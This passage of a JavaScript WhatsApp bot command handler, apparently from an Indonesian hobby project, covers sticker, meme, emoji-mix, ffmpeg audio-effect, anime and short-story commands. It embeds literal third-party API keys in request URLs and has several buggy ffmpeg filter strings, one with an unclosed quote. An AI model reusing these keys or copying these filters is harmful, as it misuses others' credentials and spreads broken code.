• *Antilink:* ${isAntiLink ? "aktif" : "tidak"}
• *Tiktok Auto:* ${isAutoDownTT ? "aktif" : "tidak"}`
        reply(cekgcnya)
        break
      case 'react': {
        const reactionMessage = { react: { text: "🗿", key: msg.key } }
        conn.sendMessage(from, reactionMessage)
      }
        break

      //TOOLS

      case 'tourl': case 'upload':
        if (isVideo || isQuotedVideo) {
          await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender.split("@")[0]}.mp4`)
          reply(mess.wait)
          let buffer_up = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp4`)
          var rand2 = 'sticker/' + getRandom('.mp4')
          fs.writeFileSync(`./${rand2}`, buffer_up)
          var text = await TelegraPh(rand2)
          reply(text)
          fs.unlinkSync(`./sticker/${sender.split("@")[0]}.mp4`)
          fs.unlinkSync(rand2)
        } else if (isImage || isQuotedImage) {
          var mediany = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender.split("@")[0]}.jpg`)
          reply(mess.wait)
          let buffer_up = fs.readFileSync(mediany)
          var rand2 = 'sticker/' + getRandom('.png')
          fs.writeFileSync(`./${rand2}`, buffer_up)
          var text = await TelegraPh(rand2)
          reply(text)
          fs.unlinkSync(mediany)
          fs.unlinkSync(rand2)
        }
        break

      // CONVERT
      case 'toimg': case 'toimage':

        if (isSticker || isQuotedSticker) {
          await conn.downloadAndSaveMediaMessage(msg, "sticker", `./sticker/${sender.split("@")[0]}.webp`)
          let buffer = fs.readFileSync(`./sticker/${sender.split("@")[0]}.webp`)
          var rand1 = 'sticker/' + getRandom('.webp')
          var rand2 = 'sticker/' + getRandom('.png')
          fs.writeFileSync(`./${rand1}`, buffer)
          reply(mess.wait)
          exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
            fs.unlinkSync(`./${rand1}`)
            if (err) return reply(mess.error.api)
            conn.sendMessage(from, { caption: `*Sticker Convert To Image!*`, image: fs.readFileSync(`./${rand2}`), jpegThumbnail: fs.readFileSync('./sticker/thumb.jpg') }, { quoted: msg })
            fs.unlinkSync(`./${rand2}`)
            fs.unlinkSync(`./sticker/${sender.split("@")[0]}.webp`)
          })
        } else {
          reply('*Reply sticker nya dengan pesan #toimg*\n\n*Atau bisa sticker gif dengan pesan #tovideo*')
        }
        break
      case 'tomp4': case 'tovideo':

        if (isSticker || isQuotedSticker) {
          await conn.downloadAndSaveMediaMessage(msg, "sticker", `./sticker/${sender.split("@")[0]}.webp`)
          let buffer = `./sticker/${sender.split("@")[0]}.webp`
          reply(mess.wait)
          let webpToMp4 = await webp2mp4File(buffer)
          conn.sendMessage(from, { video: { url: webpToMp4.result }, caption: 'Convert Webp To Video' }, { quoted: msg })
          fs.unlinkSync(buffer)
        } else {
          reply('*Reply sticker gif dengan pesan #tovideo*')
        }
        break
      case 'emojimix': case 'mixemoji':
      case 'emojmix': case 'emojinua':

        if (!q) return reply(`Kirim perintah ${command} emoji1+emoji2\ncontoh : !${command} 😜+😅`)
        if (!q.includes('+')) return reply(`Format salah, contoh pemakaian !${command} 😅+😭`)
        var emo1 = q.split("+")[0]
        var emo2 = q.split("+")[1]
        if (!isEmoji(emo1) || !isEmoji(emo2)) return reply(`Itu bukan emoji!`)
        fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emo1)}_${encodeURIComponent(emo2)}`)
          .then(data => {
            var opt = { packname: setting.group.judul, author: pushname }
            conn.sendImageAsSticker(from, data.results[0].url, msg, opt)
          }).catch((e) => reply(mess.error.api))
        break
      case 'emojimix2': case 'mixemoji2':
      case 'emojmix2': case 'emojinua2': {
        if (!q) return reply(`Example : ${prefix + command} 😅`)
        let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(q)}`)
        for (let res of anu.results) {
          var opt = { packname: setting.group.judul, author: pushname }
          let encmedia = await conn.sendImageAsSticker(from, res.url, msg, opt)
        }
      }
        break
      case 'smeme':
      case 'stikermeme':
      case 'stickermeme':
      case 'memestiker':

        var atas = q.split('|')[0]
        var bawah = q.split('|')[1]
        if (!atas) return reply(`Kirim gambar dengan caption ${prefix + command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
        if (!bawah) return reply(`Kirim gambar dengan caption ${prefix + command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
        if (isImage || isQuotedImage) {
          reply(mess.wait)
          var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender.split('@')[0]}.jpg`)
          var media_url = (await TelegraPh(media))
          var meme_url = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${media_url}`
          var opt = { packname: 'SedativeBot', author: 'By Rafly11' }
          conn.sendImageAsSticker(from, meme_url, msg, opt)
          fs.unlinkSync(media)
        } else {
          reply(`Kirim gambar dengan caption ${prefix + command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
        }
        break
      case 'swm':
      case 'stikerwm':
      case 'stickerwm':
      case 'takesticker':
      case 'take':

        if (!q) return reply(`reply sticker dgn caption: ${prefix + command} packname|author atau balas video/foto yang sudah dikirim`)
        var pname = q.split('|')[0]
        var athor = q.split('|')[1]
        if (isSticker || isQuotedSticker) {
          await conn.downloadAndSaveMediaMessage(msg, "sticker", `./sticker/${sender.split("@")[0]}.webp`)
          var media = fs.readFileSync(`./sticker/${sender.split("@")[0]}.webp`)
          let stc = new Sticker(media, {
            pack: `${pname}`, // The pack name
            author: `${athor}`, // The author name
            type: StickerTypes.FULL, // The sticker type
            categories: ['🤩', '🎉'], // The sticker category
            id: '12345', // The sticker id
            quality: 50, // The quality of the output file
            background: 'transparent' // The sticker background color (only for full stickers)
          })
          var buffer = await stc.toBuffer()
          conn.sendMessage(from, { sticker: buffer, fileLength: 1000000000000 }, { quoted: msg })
          fs.unlinkSync(`./sticker/${sender.split("@")[0]}.webp`)
        } else {
          reply(`reply dengan caption ${prefix + command} packname|author atau balas video/foto yang sudah dikirim`)
        }
        break
      case 'sticker': case 's': case 'stiker':

        if (isImage || isQuotedImage) {
          await conn.downloadAndSaveMediaMessage(msg, "image", `./sticker/${sender.split("@")[0]}.jpeg`)
          let stci = fs.readFileSync(`./sticker/${sender.split("@")[0]}.jpeg`)
          let stc = new Sticker(stci, {
            pack: '', // The pack name
            author: setting.group.judul, // The author name
            type: StickerTypes.FULL, // The sticker type
            categories: ['🤩', '🎉'], // The sticker category
            id: '12345', // The sticker id
            quality: 75, // The quality of the output file
            background: 'transparent' // The sticker background color (only for full stickers)
          })
          var buffer = await stc.toBuffer()
          conn.sendMessage(from, { sticker: buffer, fileLength: 99999999 }, { quoted: msg })
          fs.unlinkSync(`./sticker/${sender.split("@")[0]}.jpeg`)
        } else if (isVideo && msg.message.videoMessage.seconds < 10 || isQuotedVideo && quotedMsg.videoMessage.seconds < 10) {
          await conn.downloadAndSaveMediaMessage(msg, "video", `./sticker/${sender.split("@")[0]}.mp4`)
          let stcg = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp4`)
          let sticker = new Sticker(stcg, {
            pack: '', // The pack name
            author: setting.group.judul, // The author name
            type: StickerTypes.FULL, // The sticker type
            categories: ['🤩', '🎉'], // The sticker category
            id: '12345', // The sticker id
            quality: 20, // The quality of the output file
            background: 'transparent' // The sticker background color (only for full stickers)
          })
          const stikk = await sticker.toBuffer()
          conn.sendMessage(from, { sticker: stikk }, { quoted: msg })
          fs.unlinkSync(`./sticker/${sender.split("@")[0]}.mp4`)
        }
        break
      case 'stickercrop': case 'scrop': case 'stikercrop':

        if (isImage || isQuotedImage) {
          await conn.downloadAndSaveMediaMessage(msg, "image", `./sticker/${sender.split("@")[0]}.jpeg`)
          let stci = fs.readFileSync(`./sticker/${sender.split("@")[0]}.jpeg`)
          let stc = new Sticker(stci, {
            pack: '', // The pack name
            author: setting.group.judul, // The author name
            type: StickerTypes.CROPPED, // The sticker type
            categories: ['🤩', '🎉'], // The sticker category
            id: '12345', // The sticker id
            quality: 75, // The quality of the output file
            background: 'transparent' // The sticker background color (only for full stickers)
          })
          var buffer = await stc.toBuffer()
          conn.sendMessage(from, { sticker: buffer, fileLength: 99999999 }, { quoted: msg })
          fs.unlinkSync(`./sticker/${sender.split("@")[0]}.jpeg`)
        } else if (isVideo && msg.message.videoMessage.seconds < 10 || isQuotedVideo && quotedMsg.videoMessage.seconds < 10) {
          await conn.downloadAndSaveMediaMessage(msg, "video", `./sticker/${sender.split("@")[0]}.mp4`)
          let stcg = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp4`)
          let sticker = new Sticker(stcg, {
            pack: '', // The pack name
            author: setting.group.judul, // The author name
            type: StickerTypes.CROPPED, // The sticker type
            categories: ['🤩', '🎉'], // The sticker category
            id: '12345', // The sticker id
            quality: 20, // The quality of the output file
            background: 'transparent' // The sticker background color (only for full stickers)
          })
          const stikk = await sticker.toBuffer()
          conn.sendMessage(from, { sticker: stikk }, { quoted: msg })
          fs.unlinkSync(`./sticker/${sender.split("@")[0]}.mp4`)
        }
        break
      case 'joker':
      case 'digital':
      case 'nulis':
      case 'nulis2':
      case 'quoteser':
      case 'quobucin': {

        if (!q) return reply(`Contoh:\n${prefix + command} saya bukan wibu`)
        reply(mess.wait)
        var buc = `https://saipulanuar.ga/api/textmaker/${command}?text=${q}&apikey=jPHjZpQF`
        conn.sendMessage(from, { image: { url: buc }, caption: 'Done!' }, { quoted: msg })
      }
        break
      case 'badgirlserti': case 'goodgirlserti': case 'bucinserti': case 'fuckgirlserti': case 'toloserti': {
        if (!q) return reply(`*Contoh:*\n${prefix + command} text`)
        var anu = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${setting.api_lolkey}&name=${q}`)
        reply(mess.wait)
        conn.sendMessage(from, { image: anu, caption: `${command}` }, { quoted: msg }).catch((err) => reply('Maaf server LolHuman sedang down'))
      }
        break

      // PHOTOOXY

      case 'textpro':
        adReply(`${listtextpro(prefix)}`, 'TEXT PRO', setting.footer, msg)
        break
      case 'ephoto':
        adReply(`${listephoto(prefix)}`, 'EPHOTO', setting.footer, msg)
        break

      case "metallic":
      case "naruto":
      case "butterfly":
      case "flaming": {

        if (!q) return reply(`_Contoh_\n${prefix + command} nama`)
        reply(mess.wait)
        let photooxy = `https://api.nataganz.com/api/photooxy/${command}?text=${q}&apikey=Pasha`
        conn.sendMessage(from, { image: { url: photooxy }, caption: `Hasil dari ${command}` }, { quoted: msg })
      }
        break

      // AUDIO CHANGER
      case 'bass': {

        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-af equalizer=f=54:width_type=o:width=2:g=20'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'blown': {

        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-af acrusher=.1:1:64:0:log'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'deep': {

        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-af atempo=4/4,asetrate=44500*2/3'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'earrape': {

        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-af volume=12'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'fast': {

        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-filter:a "atempo=1.63,asetrate=44100"'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'fat': {

        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-filter:a "atempo=1.6,asetrate=22100"'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'nightcore': {

        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-filter_complex "areverse'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'reverse': {

        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-filter_complex "areverse"'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'robot': {

        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'slow': {

        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-filter:a "atempo=0.7,asetrate=44100"'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'smooth': {

        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'tupai': {

        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-filter:a "atempo=0.5,asetrate=65100"'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      // ANIMANGA
      case 'ppcouple': case 'ppcp': {
        let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
        let random = anu[Math.floor(Math.random() * anu.length)]
        conn.sendMessage(from, { image: { url: random.male }, caption: `Foto Couple Male` }, { quoted: msg })
        conn.sendMessage(from, { image: { url: random.female }, caption: `Fofo Couple Female` }, { quoted: msg })
      }
        break

      case 'genshin':
        const gsn = JSON.parse(fs.readFileSync('./database/genshin.json'))
        var data = gsn[Math.floor(Math.random() * gsn.length)]
        var hasil = await getBuffer(data)
        await conn.sendMessage(from, { image: hasil, jpegThumbnail: fs.readFileSync('./sticker/thumb.jpg'), fileLength: 999999999 })
        break
      case 'addgenshin':
      case 'addgsn':
        if (isImage || isQuotedImage) {
          const genshin = JSON.parse(fs.readFileSync('./database/genshin.json'));
          var mediany = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender.split("@")[0]}.jpg`)
          let buffer_up = fs.readFileSync(mediany)
          var rand2 = 'sticker/' + getRandom('.png')
          fs.writeFileSync(`./${rand2}`, buffer_up)
          var text = await TelegraPh(rand2)
          genshin.push(text)
          fs.writeFileSync('./database/genshin.json', JSON.stringify(genshin, null, 2))
          adReply('*Done add picture to database!*', 'Genshin Impact', `Total Picture: ${genshin.length}`)
          fs.unlinkSync(mediany)
          fs.unlinkSync(rand2)
        }
        break

      case 'otakudesu-latest':
      case 'otakulast':
        await fetchJson("https://weebs-nime.kimiakomtol.repl.co/otakudesu/ongoing/page/1").then(async (res) => {
         var teks = `Otakudesu Ongoing\n\n`
          for (let g of res.ongoing) {
            teks += `• *Title* : ${g.title}\n`
            teks += `• *Total Episode* : ${g.total_episode}\n`
            teks += `• *Link* : ${g.url}\n\n────────────────────────\n\n`
          }
          reply(teks)
        })
        break

      case 'otakudesu-detail':
      case 'otakudet':
        if (!q) return reply(`Contoh penggunaan:\n${prefix + command} https://otakudesu.lol/anime/tegoku-daimau-sub-indo/`)
        await fetchJson(`https://weebs-nime.kimiakomtol.repl.co/otakudesu/detail?url=${q}`).then(async (res) => {
          var teks = `${res.anime_detail.title}\n\n`
          for (let g of res.episode_list) {
            teks += `• *Title:* ${g.episode_title}\n`
            teks += `• *Date:* ${g.episode_date}\n`
            teks += `• *Link:* ${g.episode_url}\n────────────────────────\n\n`
          }
          reply(teks)
        })
        break

      // cerpen

      case 'cerpen':
        adReply(`${listcerpen(prefix)}`, 'Cerpen List', setting.footer, msg)
        break

      case 'cerpen-anak': {

        let cerpe = await cerpen(`anak`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-bahasadaerah': {

        let cerpe = await cerpen(`bahasa daerah`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-bahasainggris': {

        let cerpe = await cerpen(`bahasa Inggris`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-bahasajawa': {

        let cerpe = await cerpen(`bahasa jawa`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-bahasasunda': {

        let cerpe = await cerpen(`bahasa sunda`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-budaya': {

        let cerpe = await cerpen(`budaya`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-cinta': {

        let cerpe = await cerpen(`cinta`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-cintaislami': {

        let cerpe = await cerpen(`cinta islami`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-cintapertama': {

        let cerpe = await cerpen(`cinta pertama`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-cintaromantis': {

        let cerpe = await cerpen(`cinta romantis`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-cintasedih': {

        let cerpe = await cerpen(`cinta sedih`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-cintasegitiga': {

        let cerpe = await cerpen(`Cinta segitiga`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-cintasejati': {

        let cerpe = await cerpen(`cinta sejati`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-galau': {

        let cerpe = await cerpen(`galau`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-gokil': {

        let cerpe = await cerpen(`gokil`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-inspiratif': {

        let cerpe = await cerpen(`inspiratif`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-jepang': {

        let cerpe = await cerpen(`jepang`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-kehidupan': {

        let cerpe = await cerpen(`kehidupan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-keluarga': {

        let cerpe = await cerpen(`keluarga`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-kisahnyata': {

        let cerpe = await cerpen(`kisah nyata`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-korea': {

        let cerpe = await cerpen(`korea`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-kristen': {

        let cerpe = await cerpen(`kristen`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-liburan': {

        let cerpe = await cerpen(`liburan`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
